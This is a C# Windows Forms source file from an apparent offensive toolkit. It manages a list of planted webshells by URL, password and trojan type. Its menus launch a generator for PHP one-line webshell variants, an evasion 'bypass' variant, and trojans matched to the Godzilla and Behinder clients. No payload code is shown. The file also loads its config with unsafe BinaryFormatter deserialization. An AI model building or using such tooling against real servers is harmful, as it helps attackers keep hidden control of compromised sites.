using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm : Form
    {
        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "config.db");
        public WebShellManageForm()
        {
            InitializeComponent();
        }

        private void AddShellMenu_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog();
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);

            SaveDB();
        }

        private void RefreshTasks()
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
                tasks.Add(new WebShellTaskConfig(lvi.SubItems[0].Text,  // 创建时间
                                                 lvi.SubItems[1].Text,  // 名称
                                                 lvi.SubItems[2].Text,  // url
                                                 lvi.SubItems[3].Text,  // 密码
                                                 lvi.SubItems[4].Text,  // 木马类型
                                                 lvi.SubItems[5].Text,  // 客户端版本
                                                 lvi.SubItems[6].Text));// 数据库配置
        }

        private void SaveDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                   new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
        }

        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }

        }

        public void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            foreach (WebShellTaskConfig config in tasks)
                LV.Items.Add(NewLVI(config));
        }

        private static ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.DatabaseConfig);

            lvi.Tag = config; // 指针关联
            return lvi;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Remove();
            
            RefreshTasks();
            SaveDB();
        }

        private void PHPEvalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("PHP通用型一句话Trojan").ShowDialog();
        }

        private void BypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("凯撒变种Trojan").ShowDialog();
        }

        private void 变体1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种1").ShowDialog();
        }

        private void 变种2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种2").ShowDialog();
        }

        private void 变种3ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种3").ShowDialog();
        }

        private void 变种4ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种4").ShowDialog();
        }

        private void 变种5ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种5").ShowDialog();
        }

        private void 变种6ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种6").ShowDialog();
        }

        private void 变种7ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种7").ShowDialog();
        }

        private void 变种8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种8").ShowDialog();
        }

        private void 变种9ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种9").ShowDialog();
        }

        private void GodzillaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }

        private void BehinderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("三代冰蝎配套Trojan").ShowDialog();
        }
    }
}
